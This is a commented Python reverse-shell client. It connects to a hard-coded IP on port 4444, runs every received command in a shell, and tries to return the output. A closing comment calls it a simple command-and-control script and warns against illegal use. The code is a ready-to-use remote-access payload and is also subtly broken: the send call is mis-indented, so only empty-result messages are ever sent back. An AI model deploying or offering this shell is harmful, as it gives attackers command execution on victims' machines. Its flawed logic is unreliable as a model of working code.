#These lines import the sys module for system-related functionalities,
# the socket module for handling network connections, and the subprocess module for running shell commands.
import sys
import socket
import subprocess

#The script defines the IP address and port number of the server to which it will connect.
server_ip = "192.168.73.109"
port = 4444

#A socket (s) is created, and the script connects to the specified server IP address and port number.
s = socket.socket()
s.connect((server_ip,port))

#The script receives an initial message from the server, decodes it, and prints it to the console.
msg = s.recv(1024).decode()
print('[*] server: ',msg)

#The script enters a loop where it continuously receives commands from the server.
while True:
    cmd = s.recv(1024).decode()
    print(f'[+] recieved command: {cmd}')
    
    #If the received command is one of the specified exit commands, 
    #the loop is broken, and the script will close the connection to the server.
    if cmd.lower() in ['q','quit','exit','x']:
        break
    
    #The received command is executed using the subprocess.check_output function. 
    #If an exception occurs during command execution, the exception message is encoded into bytes.
    try:
        result = subprocess.check_output(cmd,stderr=subprocess.STDOUT,shell=True)
    except Exception as e:
        result = str(e).encode()
        
    #If the result of command execution is empty, a success message is assigned to the result variable.
    if len(result) == 0:
        result = '[+] Executed Successfully'.encode()
        
        #The script sends the result (output or error message) back to the server.
        s.send(result)
        
#Once the loop is exited (due to the quit command), the script closes the connection to the server. 
s.close()

#**Note:**#
#This script is part of a simple command-and-control system where the server sends commands to the client, and the client executes these commands and sends back the results. 
# Such scripts have legitimate use cases for remote management but can also be misused for malicious purposes. 
#It's important to use and understand such code responsibly and within legal and ethical boundaries. 
#Unauthorized access and use of similar code for malicious purposes are illegal and unethical.
